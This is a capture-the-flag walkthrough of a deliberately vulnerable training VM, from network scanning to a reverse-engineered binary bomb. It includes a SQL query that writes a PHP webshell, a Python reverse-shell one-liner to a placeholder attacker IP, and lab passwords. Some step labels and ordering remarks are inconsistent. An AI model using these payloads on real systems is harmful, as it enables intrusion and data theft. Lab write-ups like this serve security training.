# Privilege Escalation Through Sequential Challenges

1. Start the Machine

	Once the machine is powered on (or started from a hypervisor), wait for the boot process to reach the GRUB menu prompt.

2. Network Reconnaissance

	Using **netdiscover**, the internal network was scanned to find live hosts and services:

	```bash
	sudo netdiscover -r <your-ip/mask>
	```

	Output:

	```
	Currently scanning: Finished!   |   Screen View: Unique Hosts

	5 Captured ARP Req/Rep packets, from 2 hosts.   Total size: 210
	_____________________________________________________________________________
	IP            At MAC Address     Count     Len  MAC Vendor / Hostname
	-----------------------------------------------------------------------------
	<vm-ip> 08:00:27:2e:4e:0b      2      84  PCS Systemtechnik GmbH
	```

3. Using **nmap**, the internal network was scanned to find live hosts and services:

	```bash
	nmap -p- -sV 192.168.190.182
	```

	Result: Host with several open services:

	* FTP (vsftpd 2.0.8+)
	* SSH (OpenSSH 5.9p1)
	* HTTP/HTTPS (Apache 2.2.22)
	* IMAP and SSL/IMAP (Dovecot)

4. Web Enumeration and Initial Access

	Use **ffuf** to fuzz directories on the webserver:

	```bash
	ffuf -u https://<vm-ip>/FUZZ -w /usr/share/wordlists/dirb/common.txt
	```

	Result:

	* `/forum` (redirects with 301)
	* `/phpmyadmin` (redirects with 301)
	* `/webmail` (redirects with 301)

5. Forum Login and Credentials Leak

	Navigate to the vulnerable web application at:

	```
	https://<vm-ip>/forum
	```

	You can find a post titled **"Probleme login ?"** by the user **lmezard**, dated *2015-10-08 00:10*.

	Inside the forum post (or associated logs), notice a suspicious log line:

	```
	Oct 5 08:45:29 BornToSecHackMe sshd[7547]: Failed password for invalid user !q\]Ej?*5K5cy*AJ from 161.202.39.38 port 57764 ssh2
	```

	This is an SSH authentication failure showing an attempted login with a password.
	Using the forum's user interface, we can find the **Users** button at the top right corner of the forum page. On the Users page, several users are listed. The password from the log matches the user **lmezard**.

	In the profile or edit profile page of the user **lmezard**, we can find the registered email address:

	```
	laurie@borntosec.net
	```

6. Accessing Webmail and Database Credentials

	Logged into **webmail** with lmezard's credentials and the same password as the forum password.

	In the email titled "DB Access" we see:

	```
	Use root/Fg-'kKXBj87E:aJ$ to access databases.
	```

	We can use these credentials to login to **phpMyAdmin** at `/phpmyadmin`.

7. SQL Injection and Remote Code Execution

	In phpMyAdmin's SQL tab, we can execute:

	```sql
	SELECT "<?php echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>'; ?>" 
	INTO OUTFILE '/var/www/forum/templates_c/payload.php';
	```

	Verify webshell access:

	```
	https://192.168.190.182/forum/templates_c/payload.php?cmd=whoami
	```

	Confirm it outputs `www-data`.

8. Getting Reverse Shell

	Checked for Python binary:

	```
	https://192.168.190.182/forum/templates_c/payload.php?cmd=which%20python
	```

	Got `/usr/bin/python`. Now we can give a reverse shell payload:

	```bash
	python -c "import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('<attacker-ip>',<port>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn('/bin/bash')"
	```

	> Replace `<attacker-ip>` and `<port>`

	Encode the payload for URL and run it via the webshell. Listen on port 1234 with `nc -lvnp 1234` and get a reverse shell as `www-data`.
	To access the reverse shell, use `nc`:

	```bash
	nc -lvnp <port>
	```

9. Local Enumeration

	Inside the shell:

	```bash
	cd /home
	ls -l
	```

	Output:

	```bash
	total 0
	drwxr-x--- 2 www-data             www-data              31 Oct  8  2015 LOOKATME
	drwxr-x--- 6 ft_root              ft_root              156 Jun 17  2017 ft_root
	drwxr-x--- 3 laurie               laurie               143 Oct 15  2015 laurie
	drwxr-x--- 4 laurie@borntosec.net laurie@borntosec.net 113 Oct 15  2015 laurie@borntosec.net
	dr-xr-x--- 2 lmezard              lmezard               61 Oct 15  2015 lmezard
	drwxr-x--- 3 thor                 thor                 129 Oct 15  2015 thor
	drwxr-x--- 4 zaz                  zaz                  147 Oct 15  2015 zaz
	```

10. Privilege Escalation: lmezard user

	Navigate to `/home/LOOKATME` and find a `password` file:

	```
	lmezard:G!@M6f4Eatau{sF"
	```

	Switch user to lmezard:

	```bash
	su lmezard
	```

	Password: G!@M6f4Eatau{sF"

	Successfully logged in as lmezard.

11. Accessing Lmezard's Home Directory

	```bash
	cd ~
	ls -l
	```

	Output:

	```
	total 791
	-rwxr-x--- 1 lmezard lmezard 808960 Oct  8  2015 fun
	-rwxr-x--- 1 lmezard lmezard     96 Oct 15  2015 README
	```

	Run:

	```
	cat README
	```

	Output:

	```
	Complete this little challenge and use the result as password for user 'laurie' to login in ssh
	```

12. Inspecting the `fun` File

	```bash
	file fun
	```
	
	Result:

	```
	fun: POSIX tar archive (GNU)
	```

13. Extracting the Archive

	```bash
	cd /tmp
	tar -xvf ~/fun
	ls -l
	ft_fun
	cd ft_fun
	ls -la
	```

	Output:

	```
	total 3028
	drwxr-x--- 2 lmezard lmezard 15040 Sep 15  2015 .
	drwxrwxrwt 5 root    root      100 Aug  8 09:29 ..
	-rw-r----- 1 lmezard lmezard    26 Aug 13  2015 00M73.pcap
	-rw-r----- 1 lmezard lmezard    28 Aug 13  2015 01IXJ.pcap
	...
	-rw-r----- 1 lmezard lmezard    28 Aug 13  2015 ZQTK1.pcap
	```

	> *Note:* The directory contains many `.pcap` files that are parts of one code, but they are unsorted. Each file contains a comment indicating the next line.

14. Combining PCAP Files to Source Code

	Use the provided `pcap_to_c.py` script to merge the `.pcap` files into one `main.c` source file:

	```bash
	cat > pcap_to_c.py << EOF
	```

	Paste the script content, then type `EOF`.

	Run the script and compile the resulting code:

	```bash
	python pcap_to_c.py
	cc main.c
	```

15. Running the Compiled Program

	```bash
	./a.out
	```

	Output:

	```bash
	MY PASSWORD IS: Iheartpwnage
	Now SHA-256 it and submit
	```

16. Final Password and SSH Access

	The SHA-256 hash of the password is:

	```
	330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4
	```

	Use this hash as the password to switch to user `laurie` via SSH:

	```bash
	su laurie
	```
	Then enter the password when prompted.

17. Laurie User Directory and Files

	```bash
	ls -l
	```

	Result:

	```
	total 27
	-rwxr-x--- 1 laurie laurie 26943 Oct  8  2015 bomb
	-rwxr-x--- 1 laurie laurie   158 Oct  8  2015 README
	```

18. Reading Laurie's README

	```bash
	cat README
	```

	Result:

	```
	Diffuse this bomb!
	When you have all the password use it as "thor" user with ssh.

	HINT:
	P
	 2
	 b

	o
	4

	NO SPACE IN THE PASSWORD (password is case sensitive).
	```

19. Checking the `bomb` Executable Type

	```bash
	file bomb
	```

	Result:

	```
	bomb: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.0.0, not stripped
	```

20. Disassembling the `bomb` Binary Main Function with GDB

	```bash
	gdb bomb
	(gdb) disas main
	```

	Result (excerpt):

	```asm
	Dump of assembler code for function main:
		0x080489b0 <+0>:	push   %ebp
		0x080489b1 <+1>:	mov    %esp,%ebp
		0x080489b3 <+3>:	sub    $0x14,%esp
		...
		0x08048a5b <+171>:	call   0x8048b20 <phase_1>
		0x08048a60 <+176>:	call   0x804952c <phase_defused>
		...
		0x08048b0a <+346>:	call   0x8048d98 <phase_6>
		0x08048b0f <+351>:	call   0x804952c <phase_defused>
		0x08048b14 <+356>:	xor    %eax,%eax
		0x08048b16 <+358>:	mov    -0x18(%ebp),%ebx
		0x08048b19 <+361>:	mov    %ebp,%esp
		0x08048b1b <+363>:	pop    %ebp
		0x08048b1c <+364>:	ret
	End of assembler dump.
	```

21. Disassembling `phase_1` Function

	```bash
	(gdb) disas phase_1
	```

	Result:

	```asm
	Dump of assembler code for function phase_1:
		0x08048b20 <+0>:	push   %ebp
		0x08048b21 <+1>:	mov    %esp,%ebp
		0x08048b23 <+3>:	sub    $0x8,%esp
		0x08048b26 <+6>:	mov    0x8(%ebp),%eax
		0x08048b29 <+9>:	add    $0xfffffff8,%esp
		0x08048b2c <+12>:	push   $0x80497c0
		0x08048b31 <+17>:	push   %eax
		0x08048b32 <+18>:	call   0x8049030 <strings_not_equal>
		0x08048b37 <+23>:	add    $0x10,%esp
		0x08048b3a <+26>:	test   %eax,%eax
		0x08048b3c <+28>:	je     0x8048b43 <phase_1+35>
		0x08048b3e <+30>:	call   0x80494fc <explode_bomb>
		0x08048b43 <+35>:	mov    %ebp,%esp
		0x08048b45 <+37>:	pop    %ebp
		0x08048b46 <+38>:	ret
	End of assembler dump.
	```

22. Inspecting String at Address 0x80497c0

	```bash
	(gdb) x/s 0x80497c0
	```

	Result:

	```
	0x80497c0:	"Public speaking is very easy."
	```

	Answer: `Public speaking is very easy.`

23. Disassembling `phase_2` Function

	```bash
	(gdb) disas phase_2
	```

	Result (excerpt):

	```asm
	Dump of assembler code for function phase_2:
		0x08048b48 <+0>:	push   %ebp
		0x08048b49 <+1>:	mov    %esp,%ebp
		0x08048b4b <+3>:	sub    $0x20,%esp
		0x08048b4e <+6>:	push   %esi
		0x08048b4f <+7>:	push   %ebx
		0x08048b50 <+8>:	mov    0x8(%ebp),%edx
		0x08048b53 <+11>:	add    $0xfffffff8,%esp
		0x08048b56 <+14>:	lea    -0x18(%ebp),%eax
		0x08048b59 <+17>:	push   %eax
		0x08048b5a <+18>:	push   %edx
		0x08048b5b <+19>:	call   0x8048fd8 <read_six_numbers>
		0x08048b60 <+24>:	add    $0x10,%esp
		0x08048b63 <+27>:	cmpl   $0x1,-0x18(%ebp)
		0x08048b67 <+31>:	je     0x8048b6e <phase_2+38>
		0x08048b69 <+33>:	call   0x80494fc <explode_bomb>
		0x08048b6e <+38>:	mov    $0x1,%ebx
		0x08048b73 <+43>:	lea    -0x18(%ebp),%esi
		0x08048b76 <+46>:	lea    0x1(%ebx),%eax
		0x08048b79 <+49>:	imul   -0x4(%esi,%ebx,4),%eax
		0x08048b7e <+54>:	cmp    %eax,(%esi,%ebx,4)
		0x08048b81 <+57>:	je     0x8048b88 <phase_2+64>
		0x08048b83 <+59>:	call   0x80494fc <explode_bomb>
		0x08048b88 <+64>:	inc    %ebx
		0x08048b89 <+65>:	cmp    $0x5,%ebx
		0x08048b8c <+68>:	jle    0x8048b76 <phase_2+46>
		0x08048b8e <+70>:	lea    -0x28(%ebp),%esp
		0x08048b91 <+73>:	pop    %ebx
		0x08048b92 <+74>:	pop    %esi
		0x08048b93 <+75>:	mov    %ebp,%esp
		0x08048b95 <+77>:	pop    %ebp
		0x08048b96 <+78>:	ret    
	End of assembler dump.
	```

24. Disassembling `read_six_numbers` Function

	```bash
	(gdb) disas read_six_numbers
	```

	Result (excerpt):

	```asm
	Dump of assembler code for function read_six_numbers:
		0x08048fd8 <+0>:	push   %ebp
		0x08048fd9 <+1>:	mov    %esp,%ebp
		0x08048fdb <+3>:	sub    $0x8,%esp
		0x08048fde <+6>:	mov    0x8(%ebp),%ecx
		0x08048fe1 <+9>:	mov    0xc(%ebp),%edx
		0x08048fe4 <+12>:	lea    0x14(%edx),%eax
		0x08048fe7 <+15>:	push   %eax
		0x08048fe8 <+16>:	lea    0x10(%edx),%eax
		0x08048feb <+19>:	push   %eax
		0x08048fec <+20>:	lea    0xc(%edx),%eax
		0x08048fef <+23>:	push   %eax
		0x08048ff0 <+24>:	lea    0x8(%edx),%eax
		0x08048ff3 <+27>:	push   %eax
		0x08048ff4 <+28>:	lea    0x4(%edx),%eax
		0x08048ff7 <+31>:	push   %eax
		0x08048ff8 <+32>:	push   %edx
		0x08048ff9 <+33>:	push   $0x8049b1b
		0x08048ffe <+38>:	push   %ecx
		0x08048fff <+39>:	call   0x8048860 <sscanf@plt>
		0x08049004 <+44>:	add    $0x20,%esp
		0x08049007 <+47>:	cmp    $0x5,%eax
		0x0804900a <+50>:	jg     0x8049011 <read_six_numbers+57>
		0x0804900c <+52>:	call   0x80494fc <explode_bomb>
		0x08049011 <+57>:	mov    %ebp,%esp
		0x08049013 <+59>:	pop    %ebp
		0x08049014 <+60>:	ret    
	End of assembler dump.
	```

25. Inspecting Format String for `sscanf`

	```bash
	(gdb) x/s 0x8049b1b
	```

	Result:

	```
	0x8049b1b:	 "%d %d %d %d %d %d"
	```

26. Summary of `phase_2` Logic

	* Calls `read_six_numbers` to read six integers from input.
	* Checks if the first number is `1`, else bomb explodes.
	* Then for each `i` from 1 to 5, verifies:

	```
	numbers[i] == i * numbers[i-1]
	```

	Otherwise, calls `explode_bomb`.

27. Using Script to Find Correct Input Sequence

	Answer: `1 2 6 24 120 720`

	This can be generated or verified using a helper script like `bomb_phase_2.py`.

28. Disassembling `phase_3` Function

	```bash
	(gdb) disas phase_3
	```

	Result (excerpt):

	```asm
	Dump of assembler code for function phase_3:
		0x08048b98 <+0>:	push   %ebp
		0x08048b99 <+1>:	mov    %esp,%ebp
		...
		0x08048bcd <+53>:	ja     0x8048c88 <phase_3+240>
		0x08048bd3 <+59>:	mov    -0xc(%ebp),%eax
		0x08048bd6 <+62>:	jmp    *0x80497e8(,%eax,4)
		...
		0x08048c92 <+250>:	je     0x8048c99 <phase_3+257>
		0x08048c94 <+252>:	call   0x80494fc <explode_bomb>
		0x08048c99 <+257>:	mov    -0x18(%ebp),%ebx
		0x08048c9c <+260>:	mov    %ebp,%esp
		0x08048c9e <+262>:	pop    %ebp
		0x08048c9f <+263>:	ret    
	End of assembler dump.
	```

29. Understanding `phase_3` Logic (C Pseudocode)

	```c
	void phase_3(const char *input) {
		int index, val;
		char letter;
		
		int count = sscanf(input, "%d %c %x", &index, &letter, &val);
		if (count <= 2)
			explode_bomb();

		char expected_letter;
		switch (index) {
			case 0:
				if (val != 0x309) explode_bomb();
				expected_letter = 'q';
				break;
			case 1:
				if (val != 0xd6) explode_bomb();
				expected_letter = 'b';
				break;
			case 2:
				if (val != 0x2f3) explode_bomb();
				expected_letter = 'b';
				break;
			case 3:
				if (val != 0xfb) explode_bomb();
				expected_letter = 'k';
				break;
			case 4:
				if (val != 0xa0) explode_bomb();
				expected_letter = 'o';
				break;
			case 5:
				if (val != 0x1ca) explode_bomb();
				expected_letter = 't';
				break;
			case 6:
				if (val != 0x30c) explode_bomb();
				expected_letter = 'v';
				break;
			case 7:
				if (val != 0x20c) explode_bomb();
				expected_letter = 'b';
				break;
			default:
				explode_bomb();
		}

		if (letter != expected_letter)
			explode_bomb();
	}
	```

30. Example Valid Inputs for `phase_3`

	```
	0 q 777
	1 b 214
	2 b 755
	3 k 251
	4 o 160
	5 t 458
	6 v 780
	7 b 524
	```

31. Hint Interpretation and Password Selection

	From README hint and the disassembly, a plausible choice is: `1 b 214`

	which matches index 1, letter 'b', and value 0xd6 (decimal 214).

32. Disassembling `phase_4`

	```bash
	(gdb) disas phase_4
	```

	Result (simplified):

	```as,
	Dump of assembler code for function phase_4:
		0x08048ce0 <+0>:	push   %ebp
		0x08048ce1 <+1>:	mov    %esp,%ebp
		...
		0x08048cf0 <+16>:	push   $0x8049808
		...
		0x08048d01 <+33>:	jne    0x8048d09 <explode_bomb>
		0x08048d03 <+35>:	cmpl   $0x0,-0x4(%ebp)
		0x08048d07 <+39>:	jg     0x8048d0e
		0x08048d09 <+41>:	call   explode_bomb
		...
		0x08048d15 <+53>:	call func4
		...
		0x08048d1d <+61>:	cmp    $0x37,%eax
		0x08048d20 <+64>:	je     return
		0x08048d22 <+66>:	call explode_bomb
	End of assembler dump.
	```

33. Disassembling `func4` — Recursive function

	```bash
	(gdb) disas func4
	```

	Result:

	```asm
	Dump of assembler code for function func4:
		0x08048ca0 <+0>:	push   %ebp
		0x08048ca1 <+1>:	mov    %esp,%ebp
		0x08048ca3 <+3>:	sub    $0x10,%esp
		0x08048ca6 <+6>:	push   %esi
		0x08048ca7 <+7>:	push   %ebx
		0x08048ca8 <+8>:	mov    0x8(%ebp),%ebx
		0x08048cab <+11>:	cmp    $0x1,%ebx
		0x08048cae <+14>:	jle    0x8048cd0 <func4+48>
		0x08048cb0 <+16>:	add    $0xfffffff4,%esp
		0x08048cb3 <+19>:	lea    -0x1(%ebx),%eax
		0x08048cb6 <+22>:	push   %eax
		0x08048cb7 <+23>:	call   0x8048ca0 <func4>
		0x08048cbc <+28>:	mov    %eax,%esi
		0x08048cbe <+30>:	add    $0xfffffff4,%esp
		0x08048cc1 <+33>:	lea    -0x2(%ebx),%eax
		0x08048cc4 <+36>:	push   %eax
		0x08048cc5 <+37>:	call   0x8048ca0 <func4>
		0x08048cca <+42>:	add    %esi,%eax
		0x08048ccc <+44>:	jmp    0x8048cd5 <func4+53>
		0x08048cce <+46>:	mov    %esi,%esi
		0x08048cd0 <+48>:	mov    $0x1,%eax
		0x08048cd5 <+53>:	lea    -0x18(%ebp),%esp
		0x08048cd8 <+56>:	pop    %ebx
		0x08048cd9 <+57>:	pop    %esi
		0x08048cda <+58>:	mov    %ebp,%esp
		0x08048cdc <+60>:	pop    %ebp
		0x08048cdd <+61>:	ret    
	End of assembler dump.
	```

34. `func4` in C:

	```c
	int func4(int n) {
		if (n <= 1)
			return 1;
		else
			return func4(n - 1) + func4(n - 2);
	}
	```

	This is a classic Fibonacci-style recursion with base cases returning 1.

35. Understanding `phase_4`:

	* Input is scanned as a single integer.
	* It must be > 0.
	* The program calls `func4(input)`.
	* The result must be `0x37` (decimal 55).
	* If not, bomb explodes.

36. To solve `phase_4`:

	To find integer `n` such that `func4(n) = 55` you can use a Python script like `bomb_phase_4.py`.

	Since `func4` is Fibonacci-like starting at 1 for `n=0` and `n=1`:

	Answer: `9`

37. Disassemble `phase_5` Function

	```bash
	(gdb) disas phase_5
	```

	Result:

	```asm
	Dump of assembler code for function phase_5:
		0x08048d2c <+0>:	push   %ebp
		0x08048d2d <+1>:	mov    %esp,%ebp
		0x08048d2f <+3>:	sub    $0x10,%esp
		0x08048d32 <+6>:	push   %esi
		0x08048d33 <+7>:	push   %ebx
		0x08048d34 <+8>:	mov    0x8(%ebp),%ebx
		0x08048d37 <+11>:	add    $0xfffffff4,%esp
		0x08048d3a <+14>:	push   %ebx
		0x08048d3b <+15>:	call   0x8049018 <string_length>
		0x08048d40 <+20>:	add    $0x10,%esp
		0x08048d43 <+23>:	cmp    $0x6,%eax
		0x08048d46 <+26>:	je     0x8048d4d <phase_5+33>
		0x08048d48 <+28>:	call   0x80494fc <explode_bomb>
		0x08048d4d <+33>:	xor    %edx,%edx
		0x08048d4f <+35>:	lea    -0x8(%ebp),%ecx
		0x08048d52 <+38>:	mov    $0x804b220,%esi
		0x08048d57 <+43>:	mov    (%edx,%ebx,1),%al
		0x08048d5a <+46>:	and    $0xf,%al
		0x08048d5c <+48>:	movsbl %al,%eax
		0x08048d5f <+51>:	mov    (%eax,%esi,1),%al
		0x08048d62 <+54>:	mov    %al,(%edx,%ecx,1)
		0x08048d65 <+57>:	inc    %edx
		0x08048d66 <+58>:	cmp    $0x5,%edx
		0x08048d69 <+61>:	jle    0x8048d57 <phase_5+43>
		0x08048d6b <+63>:	movb   $0x0,-0x2(%ebp)
		0x08048d6f <+67>:	add    $0xfffffff8,%esp
		0x08048d72 <+70>:	push   $0x804980b
		0x08048d77 <+75>:	lea    -0x8(%ebp),%eax
		0x08048d7a <+78>:	push   %eax
		0x08048d7b <+79>:	call   0x8049030 <strings_not_equal>
		0x08048d80 <+84>:	add    $0x10,%esp
		0x08048d83 <+87>:	test   %eax,%eax
		0x08048d85 <+89>:	je     0x8048d8c <phase_5+96>
		0x08048d87 <+91>:	call   0x80494fc <explode_bomb>
		0x08048d8c <+96>:	lea    -0x18(%ebp),%esp
		0x08048d8f <+99>:	pop    %ebx
		0x08048d90 <+100>:	pop    %esi
		0x08048d91 <+101>:	mov    %ebp,%esp
		0x08048d93 <+103>:	pop    %ebp
		0x08048d94 <+104>:	ret    
	End of assembler dump.
	```

	Summary:

	* Takes input string, expects length 6, else explode bomb.
	* For each character, extracts the lower 4 bits (nibble).
	* Uses this nibble as index into a lookup table at `0x804b220`.
	* Builds a transformed string in buffer.
	* Compares transformed string to the target string at `0x804980b`.
	* If not equal, explode bomb.

38. Disassemble `string_length` Function

	```bash
	(gdb) disas string_length
	```

	Result:

	```asm
	Dump of assembler code for function string_length:
		0x08049018 <+0>:	push   %ebp
		0x08049019 <+1>:	mov    %esp,%ebp
		0x0804901b <+3>:	mov    0x8(%ebp),%edx
		0x0804901e <+6>:	xor    %eax,%eax
		0x08049020 <+8>:	cmpb   $0x0,(%edx)
		0x08049023 <+11>:	je     0x804902c <string_length+20>
		0x08049025 <+13>:	inc    %edx
		0x08049026 <+14>:	inc    %eax
		0x08049027 <+15>:	cmpb   $0x0,(%edx)
		0x0804902a <+18>:	jne    0x8049025 <string_length+13>
		0x0804902c <+20>:	mov    %ebp,%esp
		0x0804902e <+22>:	pop    %ebp
		0x0804902f <+23>:	ret    
	End of assembler dump.
	```

	Simple string length function counting characters until null byte.

39. C Code Equivalent for `phase_5`

	```c
	void phase_5(char *input) {
		char buffer[7];
		char *table = (char *)0x804b220;  // lookup table of chars
		char *target = (char *)0x804980b; // expected target string

		if (string_length(input) != 6)
			explode_bomb();

		for (int i = 0; i <= 5; i++) {
			unsigned char idx = input[i] & 0x0F; // take low nibble
			buffer[i] = table[idx];
		}
		buffer[6] = '\0';

		if (strings_not_equal(buffer, target))
			explode_bomb();
	}
	```

40. Solve Phase 5

	* The goal is to find a 6-character input string which, when each character's low nibble is mapped through the lookup table at `0x804b220`, produces the string `"giants"` (the target string at `0x804980b`).
	* You can write or use the provided `bomb_phase_5.py` script to automate reversing the lookup and discovering the correct input string that maps to `"giants"`.

	Answer: `opekmq`

41. Disassemble `phase_6` Function

	```bash
	(gdb) disas phase_6
	```

	Result:

	```asm
	Dump of assembler code for function phase_6:
		0x08048d98 <+0>:	push   %ebp
		0x08048d99 <+1>:	mov    %esp,%ebp
		0x08048d9b <+3>:	sub    $0x4c,%esp
		0x08048d9e <+6>:	push   %edi
		0x08048d9f <+7>:	push   %esi
		0x08048da0 <+8>:	push   %ebx
		0x08048da1 <+9>:	mov    0x8(%ebp),%edx
		0x08048da4 <+12>:	movl   $0x804b26c,-0x34(%ebp)
		0x08048dab <+19>:	add    $0xfffffff8,%esp
		0x08048dae <+22>:	lea    -0x18(%ebp),%eax
		0x08048db1 <+25>:	push   %eax
		0x08048db2 <+26>:	push   %edx
		0x08048db3 <+27>:	call   0x8048fd8 <read_six_numbers>
		0x08048db8 <+32>:	xor    %edi,%edi
		0x08048dba <+34>:	add    $0x10,%esp
		0x08048dbd <+37>:	lea    0x0(%esi),%esi
		0x08048dc0 <+40>:	lea    -0x18(%ebp),%eax
		0x08048dc3 <+43>:	mov    (%eax,%edi,4),%eax
		0x08048dc6 <+46>:	dec    %eax
		0x08048dc7 <+47>:	cmp    $0x5,%eax
		0x08048dca <+50>:	jbe    0x8048dd1 <phase_6+57>
		0x08048dcc <+52>:	call   0x80494fc <explode_bomb>
		0x08048dd1 <+57>:	lea    0x1(%edi),%ebx
		0x08048dd4 <+60>:	cmp    $0x5,%ebx
		0x08048dd7 <+63>:	jg     0x8048dfc <phase_6+100>
		0x08048dd9 <+65>:	lea    0x0(,%edi,4),%eax
		0x08048de0 <+72>:	mov    %eax,-0x38(%ebp)
		0x08048de3 <+75>:	lea    -0x18(%ebp),%esi
		0x08048de6 <+78>:	mov    -0x38(%ebp),%edx
		0x08048de9 <+81>:	mov    (%edx,%esi,1),%eax
		0x08048dec <+84>:	cmp    (%esi,%ebx,4),%eax
		0x08048def <+87>:	jne    0x8048df6 <phase_6+94>
		0x08048df1 <+89>:	call   0x80494fc <explode_bomb>
		0x08048df6 <+94>:	inc    %ebx
		0x08048df7 <+95>:	cmp    $0x5,%ebx
		0x08048dfa <+98>:	jle    0x8048de6 <phase_6+78>
		0x08048dfc <+100>:	inc    %edi
		0x08048dfd <+101>:	cmp    $0x5,%edi
		0x08048e00 <+104>:	jle    0x8048dc0 <phase_6+40>
		0x08048e02 <+106>:	xor    %edi,%edi
		0x08048e04 <+108>:	lea    -0x18(%ebp),%ecx
		0x08048e07 <+111>:	lea    -0x30(%ebp),%eax
		0x08048e0a <+114>:	mov    %eax,-0x3c(%ebp)
		0x08048e0d <+117>:	lea    0x0(%esi),%esi
		0x08048e10 <+120>:	mov    -0x34(%ebp),%esi
		0x08048e13 <+123>:	mov    $0x1,%ebx
		0x08048e18 <+128>:	lea    0x0(,%edi,4),%eax
		0x08048e1f <+135>:	mov    %eax,%edx
		0x08048e21 <+137>:	cmp    (%eax,%ecx,1),%ebx
		0x08048e24 <+140>:	jge    0x8048e38 <phase_6+160>
		0x08048e26 <+142>:	mov    (%edx,%ecx,1),%eax
		0x08048e29 <+145>:	lea    0x0(%esi,%eiz,1),%esi
		0x08048e30 <+152>:	mov    0x8(%esi),%esi
		0x08048e33 <+155>:	inc    %ebx
		0x08048e34 <+156>:	cmp    %eax,%ebx
		0x08048e36 <+158>:	jl     0x8048e30 <phase_6+152>
		0x08048e38 <+160>:	mov    -0x3c(%ebp),%edx
		0x08048e3b <+163>:	mov    %esi,(%edx,%edi,4)
		0x08048e3e <+166>:	inc    %edi
		0x08048e3f <+167>:	cmp    $0x5,%edi
		0x08048e42 <+170>:	jle    0x8048e10 <phase_6+120>
		0x08048e44 <+172>:	mov    -0x30(%ebp),%esi
		0x08048e47 <+175>:	mov    %esi,-0x34(%ebp)
		0x08048e4a <+178>:	mov    $0x1,%edi
		0x08048e4f <+183>:	lea    -0x30(%ebp),%edx
		0x08048e52 <+186>:	mov    (%edx,%edi,4),%eax
		0x08048e55 <+189>:	mov    %eax,0x8(%esi)
		0x08048e58 <+192>:	mov    %eax,%esi
		0x08048e5a <+194>:	inc    %edi
		0x08048e5b <+195>:	cmp    $0x5,%edi
		0x08048e5e <+198>:	jle    0x8048e52 <phase_6+186>
		0x08048e60 <+200>:	movl   $0x0,0x8(%esi)
		0x08048e67 <+207>:	mov    -0x34(%ebp),%esi
		0x08048e6a <+210>:	xor    %edi,%edi
		0x08048e6c <+212>:	lea    0x0(%esi,%eiz,1),%esi
		0x08048e70 <+216>:	mov    0x8(%esi),%edx
		0x08048e73 <+219>:	mov    (%esi),%eax
		0x08048e75 <+221>:	cmp    (%edx),%eax
		0x08048e77 <+223>:	jge    0x8048e7e <phase_6+230>
		0x08048e79 <+225>:	call   0x80494fc <explode_bomb>
		0x08048e7e <+230>:	mov    0x8(%esi),%esi
		0x08048e81 <+233>:	inc    %edi
		0x08048e82 <+234>:	cmp    $0x4,%edi
		0x08048e85 <+237>:	jle    0x8048e70 <phase_6+216>
		0x08048e87 <+239>:	lea    -0x58(%ebp),%esp
		0x08048e8a <+242>:	pop    %ebx
		0x08048e8b <+243>:	pop    %esi
		0x08048e8c <+244>:	pop    %edi
		0x08048e8d <+245>:	mov    %ebp,%esp
		0x08048e8f <+247>:	pop    %ebp
		0x08048e90 <+248>:	ret    
	End of assembler dump.
	```

	Summary:

	* Calls `read_six_numbers` to parse six integers from input.
	* Checks each number is between 1 and 6 inclusive.
	* Ensures all numbers are unique.
	* Maps each input number to a node pointer in `node_array`.
	* Re-links nodes in the specified order.
	* Validates that the linked list values are in strictly ascending order.
	* Calls `explode_bomb()` if any validation fails.

42. Data Structures & Variables

	```c
	typedef struct node {
		int value;
		struct node *next;
	} node_t;

	extern void explode_bomb(void);
	extern int read_six_numbers(const char *input, int *nums);
	extern node_t node_array[6];  // Array of 6 nodes with fixed values
	```

	The six linked list nodes (`node1` to `node6`) have the following values:

	| Node  | Value |
	| ----- | ----- |
	| node1 | 253   |
	| node2 | 725   |
	| node3 | 301   |
	| node4 | 997   |
	| node5 | 212   |
	| node6 | 432   |

43. C Implementation of Phase 6

	```c
	void phase_6(char *input) {
		int indices[6];
		int i, j;

		// Parse six numbers from input
		if (read_six_numbers(input, indices) != 6) {
			explode_bomb();
		}

		// Validate each index is between 1 and 6
		for (i = 0; i < 6; i++) {
			if (indices[i] < 1 || indices[i] > 6) {
				explode_bomb();
			}
		}

		// Ensure all indices are unique
		for (i = 0; i < 6; i++) {
			for (j = i + 1; j < 6; j++) {
				if (indices[i] == indices[j]) {
					explode_bomb();
				}
			}
		}

		// Map indices to node pointers
		node_t *pointers[6];
		for (i = 0; i < 6; i++) {
			pointers[i] = &node_array[indices[i] - 1]; // Convert 1-based to 0-based index
		}

		// Re-link the nodes in the user-specified order
		for (i = 0; i < 5; i++) {
			pointers[i]->next = pointers[i + 1];
		}
		pointers[5]->next = NULL;

		// Verify ascending order by node value
		node_t *curr = pointers[0];
		while (curr->next != NULL) {
			if (curr->value > curr->next->value) {
				explode_bomb();
			}
			curr = curr->next;
		}
	}
	```

44. To solve `phase_4`:

	This corresponds to nodes with values:

	```
	997 -> 725 -> 432 -> 301 -> 253 -> 212
	``

	You can use the provided Python script `bomb_phase_6.py` to generate valid input sequences that pass phase 6.

	Answer: `4 2 6 3 1 5`

45. Now we can genrate `thor` password.

	According to README:

	```
	Diffuse this bomb!
	When you have all the password use it as `thor` user with ssh.

	HINT:
	P
	 2
	 b

	o
	4

	NO SPACE IN THE PASSWORD (password is case sensitive).
	```

	And Subject warrning:

	```
	For the part related to a (bin) bomb: If the password found is
	123456. The password to use is 123546.
	```

	We get password:

	```
	Publicspeakingisveryeasy.126241207201b2149opekmq426135
	```

	Switch user to thor:

	```bash
	su thor
	```

	Then enter the password when prompted.

46. Listing Files in thor's Home Directory

	```bash
	ls -l
	```

	Output:

	```
	total 32
	-rwxr-x--- 1 thor thor    69 Oct  8  2015 README
	-rwxr-x--- 1 thor thor 31523 Oct  8  2015 turtle
	```

47. Reading the README File

	```bash
	cat README
	```

	Output:

	```
	Finish this challenge and use the result as password for 'zaz' user.
	```

48. Inspecting the `turtle` File

	```bash
	file turtle
	```

	Result:

	```
	turtle: ASCII text
	```

49. Viewing the Content of `turtle`

	```bash
	cat turtle
	```

	Output (excerpt):

	```
	Tourne gauche de 90 degrees
